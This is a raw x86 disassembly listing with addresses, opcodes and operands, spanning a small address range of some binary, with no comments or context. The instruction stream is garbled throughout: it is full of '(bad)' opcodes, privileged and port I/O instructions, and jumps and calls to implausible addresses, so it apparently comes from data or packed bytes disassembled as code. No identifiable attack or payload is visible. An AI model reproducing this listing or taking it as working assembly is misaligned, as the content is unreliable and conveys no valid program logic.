  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
